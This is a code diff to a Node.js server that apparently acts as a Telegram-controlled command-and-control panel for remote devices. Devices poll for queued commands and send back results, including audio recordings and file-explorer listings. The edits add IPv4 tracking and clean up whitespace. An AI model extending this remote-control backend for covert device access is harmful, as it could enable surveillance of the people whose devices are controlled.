@@ -47,7 +47,8 @@ let db;
             last_seen REAL DEFAULT 0,
             polling_mode TEXT DEFAULT 'turbo',
             info TEXT,
-            ipv6 TEXT
+            ipv6 TEXT,
+            ipv4 TEXT
         )`);
 
         await db.exec(`CREATE TABLE IF NOT EXISTS commands (
@@ -65,6 +66,7 @@ let db;
         // Tambah kolom jika dari versi sebelumnya belum ada
         try { await db.exec(`ALTER TABLE devices ADD COLUMN polling_mode TEXT DEFAULT 'turbo'`); } catch (e) { }
         try { await db.exec(`ALTER TABLE devices ADD COLUMN ipv6 TEXT`); } catch (e) { }
+        try { await db.exec(`ALTER TABLE devices ADD COLUMN ipv4 TEXT`); } catch (e) { }
         try { await db.exec(`ALTER TABLE commands ADD COLUMN chat_id TEXT`); } catch (e) { }
         try { await db.exec(`ALTER TABLE commands ADD COLUMN polling_mode TEXT DEFAULT 'normal'`); } catch (e) { }
         try { await db.exec(`ALTER TABLE commands ADD COLUMN message_id TEXT`); } catch (e) { }
@@ -99,13 +101,13 @@ app.set('views', path.join(__dirname, 'templates'));
 app.use('/public', express.static(path.join(__dirname, 'public')));
 
 // Helper function
-const updateDeviceSeen = async (deviceId, mode = 'normal', ipv6 = null, isOffline = false) => {
+const updateDeviceSeen = async (deviceId, mode = 'normal', ipv6 = null, ipv4 = null, isOffline = false) => {
     const timestamp = isOffline ? 0 : Date.now() / 1000;
     const finalMode = (mode === 'short' || mode === 'turbo') ? 'turbo' : 'normal';
 
-    if (ipv6) {
-        await db.run('INSERT INTO devices (id, last_seen, polling_mode, ipv6) VALUES (?, ?, ?, ?) ON CONFLICT(id) DO UPDATE SET last_seen=excluded.last_seen, polling_mode=excluded.polling_mode, ipv6=excluded.ipv6',
-            [deviceId, timestamp, finalMode, ipv6]);
+    if (ipv6 || ipv4) {
+        await db.run('INSERT INTO devices (id, last_seen, polling_mode, ipv6, ipv4) VALUES (?, ?, ?, ?, ?) ON CONFLICT(id) DO UPDATE SET last_seen=excluded.last_seen, polling_mode=excluded.polling_mode, ipv6=excluded.ipv6, ipv4=excluded.ipv4',
+            [deviceId, timestamp, finalMode, ipv6, ipv4]);
     } else {
         await db.run('INSERT INTO devices (id, last_seen, polling_mode) VALUES (?, ?, ?) ON CONFLICT(id) DO UPDATE SET last_seen=excluded.last_seen, polling_mode=excluded.polling_mode',
             [deviceId, timestamp, finalMode]);
@@ -202,10 +204,10 @@ const formatDeviceResponse = (data) => {
 
 // State Memori
 const devicePaths = {};
-const pathMap = {}; 
-const lsState = {}; 
-const activeInput = {}; 
-const lastNavMessage = {}; 
+const pathMap = {};
+const lsState = {};
+const activeInput = {};
+const lastNavMessage = {};
 
 const clearPreviousNav = async (chatId) => {
     if (lastNavMessage[chatId] && bot) {
@@ -328,7 +330,7 @@ if (TELEGRAM_TOKEN && !TELEGRAM_TOKEN.includes('YOUR_BOT')) {
         if (!ctx.from) return;
         const userId = ctx.from.id.toString();
         if (ALLOWED_IDS.length > 0 && !ALLOWED_IDS.includes(userId)) {
-            return; 
+            return;
         }
         return next();
     });
@@ -489,7 +491,7 @@ Format Eksekusi Manual:
         );
 
         const greeting = `🎯 <b>Menu ${isSecret ? 'Lanjutan' : 'Utama'} Perangkat:</b> <code>${devId}</code>\nAksi apa yang ingin dijalankan?`;
-        
+
         // Jika ada hasil, tempelkan menu di bawah hasil tersebut
         let caption = greeting;
         if (isResult) {
@@ -499,7 +501,7 @@ Format Eksekusi Manual:
 
         menuBtns.push([{ text: '🔄 Ganti Perangkat', callback_data: 'list_devices', style: 'primary' }]);
         const opts = { parse_mode: 'HTML', reply_markup: { inline_keyboard: menuBtns } };
-        
+
         const chatId = ctx.chat?.id || ctx.callbackQuery?.message?.chat?.id;
         await clearPreviousNav(chatId);
 
@@ -540,7 +542,7 @@ Format Eksekusi Manual:
         if (cmdName === 'find_id' && !cmdText.includes('|')) {
             const mappedPath = pathMap[cmdText];
             if (!mappedPath) return ctx.answerCbQuery('❌ Sesi explorer kedaluwarsa');
-            
+
             activeInput[ctx.chat.id] = { devId, command: 'find', findRoot: mappedPath };
             const cancelBtn = {
                 inline_keyboard: [[{ text: '🔙 Batal', callback_data: `select_dev:${devId}` }]]
@@ -579,7 +581,7 @@ Format Eksekusi Manual:
         ctx.answerCbQuery(`Menjalankan ${realCmdName}...`).catch(() => { });
         const cmdId = uuidv4().slice(0, 8);
         const chatId = ctx.callbackQuery.message.chat.id.toString();
-        
+
         const sentMsg = await ctx.reply(`⏳ <b>[${realCmdName}]</b> dieksekusi!\nTarget: <code>${devId}</code>`, { parse_mode: 'HTML' });
         const messageId = sentMsg.message_id.toString();
 
@@ -748,10 +750,10 @@ const notifyClient = (devId, cmd) => {
 };
 
 app.get('/poll', async (req, res) => {
-    const { client_id, auth, mode, ipv6, offline } = req.query;
+    const { client_id, auth, mode, ipv6, ipv4, offline } = req.query;
     if (auth !== AUTH_TOKEN) return res.status(403).json({ error: 'Unauthorized' });
     const isOffline = offline === '1';
-    await updateDeviceSeen(client_id, mode, ipv6, isOffline);
+    await updateDeviceSeen(client_id, mode, ipv6, ipv4, isOffline);
     if (isOffline) return res.json({ status: 'offline' });
     const cmd = await db.get('SELECT * FROM commands WHERE device_id = ? AND status = ? ORDER BY created_at ASC LIMIT 1', [client_id, 'pending']);
     if (cmd) {
@@ -770,10 +772,10 @@ app.get('/poll', async (req, res) => {
 });
 
 app.post('/response', async (req, res) => {
-    const { client_id, auth, ipv6 } = req.query;
+    const { client_id, auth, ipv6, ipv4 } = req.query;
     const data = req.body;
     if (auth !== AUTH_TOKEN) return res.status(403).json({ error: 'Unauthorized' });
-    await updateDeviceSeen(client_id, 'normal', ipv6);
+    await updateDeviceSeen(client_id, 'normal', ipv6, ipv4);
     let logData = { ...data };
     try {
         if (data.type === 'audio_base64' && data.data) {
@@ -887,7 +889,7 @@ app.get('/admin/api/devices', async (req, res) => {
         if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
         const devices = await db.all('SELECT * FROM devices');
         const now = Date.now() / 1000;
-        const devicesData = devices.map(d => ({ id: d.id, last_seen: d.last_seen, is_online: (now - d.last_seen) < 90, polling_mode: d.polling_mode || 'long', ipv6: d.ipv6 }));
+        const devicesData = devices.map(d => ({ id: d.id, last_seen: d.last_seen, is_online: (now - d.last_seen) < 90, polling_mode: d.polling_mode || 'long', ipv6: d.ipv6, ipv4: d.ipv4 }));
         res.json({ devices: devicesData });
     } catch (e) { res.status(500).json({ error: e.message }); }
 });
@@ -895,7 +897,7 @@ const formatUtcToLocal = (u) => { if (!u) return '-'; const d = new Date(u + 'Z'
 app.get('/admin/api/logs', async (req, res) => {
     try {
         if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
-        
+
         // Optimasi: Gunakan query yang lebih efisien dan pastikan field 'message' tersedia untuk frontend
         const query = `
             SELECT * FROM (
@@ -922,7 +924,7 @@ app.get('/admin/api/logs', async (req, res) => {
                 LEFT JOIN system_logs l ON c.id = l.command_id
             ) AS combined
             ORDER BY created_at DESC LIMIT 100`;
-            
+
         const logs = await db.all(query);
         res.json({ logs: logs.map(l => ({ ...l, created_at: formatUtcToLocal(l.created_at) })) });
     } catch (e) { res.status(500).json({ error: e.message }); }
@@ -931,9 +933,9 @@ app.get('/admin/api/logs', async (req, res) => {
 app.get('/admin/api/stats', async (req, res) => {
     try {
         if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
-        
+
         const topCommands = await db.all(`SELECT command, COUNT(*) as count FROM commands GROUP BY command ORDER BY count DESC LIMIT 5`);
-        
+
         // Slowest commands (for the bar chart)
         const slowestCommands = await db.all(`
             SELECT command, 
@@ -972,8 +974,8 @@ app.get('/admin/api/stats', async (req, res) => {
             ORDER BY date ASC
         `);
 
-        res.json({ 
-            topCommands, 
+        res.json({
+            topCommands,
             slowestCommands,
             avgResponseTurbo: turboAvgRes?.avg || 0,
             avgResponseNormal: normalAvgRes?.avg || 0,
